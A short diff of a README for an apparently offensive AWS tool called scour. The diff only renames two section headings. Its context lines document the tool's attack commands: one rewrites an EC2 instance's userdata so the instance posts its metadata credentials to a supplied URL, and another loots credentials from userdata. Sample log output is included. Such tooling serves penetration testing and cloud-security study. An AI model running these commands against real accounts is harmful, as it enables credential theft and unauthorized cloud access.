@@ -153,7 +153,7 @@ UA Tracking: exec-env/EVSWAyidC4/jAIKVdESpU/groups-enum
 TBD
 ```
 
-## Privilege Escalation
+## PrivilegeEscalation
 ![](https://github.com/grines/scour/blob/main/scour-privesc.gif)
 * `Connected <apiuser/us-east-1> attack privesc UserData i-0f5604708c0b51429 http://url.to.capture.post.data` steal metadata credentials from EC2. Stop instance / Update userdata to post credentials to supplied url / Start instance (sends EC2 token to URL.)
 ```
@@ -162,7 +162,7 @@ TBD
 [Sun May  9 06:10:47 2021]  INF  Starting Instance i-0f5604708c0b51429 - State: pending
 ```
 
-## Credential Discovery
+## CredentialDiscovery
 ![](https://github.com/grines/scour/blob/main/scour-creds.gif)
 * `Connected <apiuser/us-east-1> attack creds UserData` loot credentials from EC2 userdata
 ```
